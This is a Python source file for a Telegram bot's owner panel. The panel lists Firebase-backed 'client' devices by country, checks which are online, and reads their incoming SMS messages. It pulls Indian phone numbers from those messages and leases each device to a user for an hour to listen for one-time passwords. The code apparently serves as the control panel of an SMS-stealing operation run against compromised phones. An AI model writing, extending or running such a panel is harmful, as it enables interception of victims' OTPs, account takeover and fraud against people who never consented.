from aiogram import Router, F
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.fsm.context import FSMContext
import asyncio, time
import database as db
from utils.ui import sc, btn
from utils.helper import is_owner, get_countries, get_servers_grouped
import firebase_utils as fbu

owner_router = Router()

@owner_router.callback_query(F.data == "owner:otp_panel")
async def owner_otp_panel(cq: CallbackQuery):
    if not is_owner(cq.from_user.id): return await cq.answer("🚫")
    d = db.load_data()
    countries = get_countries(d)
    kb = [[btn(c, f"owner:otp_country:{c}", "🌍")] for c in countries]
    kb.append([btn("back", "admin:home", "🔙")])
    await cq.message.edit_text("👑 <b>Owner OTP Panel</b>\nSelect Country:", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")

@owner_router.callback_query(F.data.startswith("owner:otp_country:"))
async def owner_otp_country(cq: CallbackQuery):
    if not is_owner(cq.from_user.id): return await cq.answer("🚫")
    country = cq.data.split(":")[2]
    d = db.load_data()
    servers = get_servers_grouped(d, country)
    
    kb = []
    for i, srv in enumerate(servers):
        kb.append([btn(f"URL {i+1} ({len(srv)} bases)", f"owner:otp_srv:{country}:{i}", "🔗")])
    kb.append([btn("back", "owner:otp_panel", "🔙")])
    await cq.message.edit_text(f"👑 <b>{country} - Servers</b>\nSelect URL:", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")

@owner_router.callback_query(F.data.startswith("owner:otp_srv:"))
async def owner_otp_srv(cq: CallbackQuery):
    if not is_owner(cq.from_user.id): return await cq.answer("🚫")
    parts = cq.data.split(":")
    country, srv_idx = parts[2], int(parts[3])
    d = db.load_data()
    servers = get_servers_grouped(d, country)
    srv = servers[srv_idx]
    
    try: await cq.message.edit_text("🔄 Fetching online devices...")
    except: pass
    
    kb = []
    now = time.time()
    for i, fb in enumerate(srv):
        clients = await fbu.fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
        if not clients: continue
        for dev_id, c in clients.items():
            is_online = c.get("status") is True or (c.get("ping", {}).get("ts", 0) > (now - 900) * 1000)
            if is_online:
                kb.append([btn(f"Device {dev_id[:8]}", f"owner:otp_dev:{country}:{srv_idx}:{fb['url']}:{dev_id}", "📱")])
                
    kb.append([btn("back", f"owner:otp_country:{country}", "🔙")])
    if len(kb) == 1: return await cq.answer("No online devices.")
    await cq.message.edit_text("Select Device to listen:", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")

@owner_router.callback_query(F.data.startswith("owner:otp_dev:"))
async def owner_otp_dev(cq: CallbackQuery):
    if not is_owner(cq.from_user.id): return await cq.answer("🚫")
    parts = cq.data.split(":")
    country, srv_idx, fb_url, dev_id = parts[2], int(parts[3]), parts[4], parts[5]
    
    uid = cq.from_user.id
    d = db.load_data()
    fbs = {f["url"]: f.get("auth") for f in d.get("firebases", [])}
    auth = fbs.get(fb_url, "")
    
    try: await cq.message.edit_text("🔄 Starting listener...")
    except: pass
    
    msgs_dict = await fbu.fetch_fb(f"{fb_url}/messages/{dev_id}.json?orderBy=%22%24key%22&limitToLast=5", auth)
    msgs = [v for k, v in msgs_dict.items() if isinstance(v, dict) and v.get("type") == "incoming"] if msgs_dict else []
    last_id = int(msgs[0].get("id", 0)) if msgs else 0
    best_nums = fbu.extract_best_numbers({}, msgs)
    
    d["user_leases"][str(uid)] = {
        "dev_id": dev_id, "fb_url": fb_url, "base_idx": "Owner", "numbers": [n for n, c in best_nums],
        "expire_at": int(time.time()) + 3600, "health": 10, "last_msg_id": last_id
    }
    db.save_data(d)
    
    text = f"👑 <b>Owner OTP Panel</b>\n\n🆔 Device: <code>{dev_id}</code>\n🔗 URL: <code>{fb_url}</code>\n\n"
    if best_nums:
        for n, c in best_nums: text += f"📞 <code>+91{n}</code>\n"
    else: text += "⚠️ SIM active. OTP aate hi number update hoga.\n"
    text += "\n⌛ <i>Listening...</i>"
    
    kb = [
        [btn("next device", f"owner:next_dev:{country}:{srv_idx}", "➡️")],
        [btn("stop", "user:stop", "⏹")],
        [btn("back", f"owner:otp_srv:{country}:{srv_idx}", "🔙")]
    ]
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")

@owner_router.callback_query(F.data.startswith("owner:next_dev:"))
async def owner_next_dev(cq: CallbackQuery):
    parts = cq.data.split(":")
    country, srv_idx = parts[2], int(parts[3])
    cq.data = f"owner:otp_srv:{country}:{srv_idx}"
    await owner_otp_srv(cq)
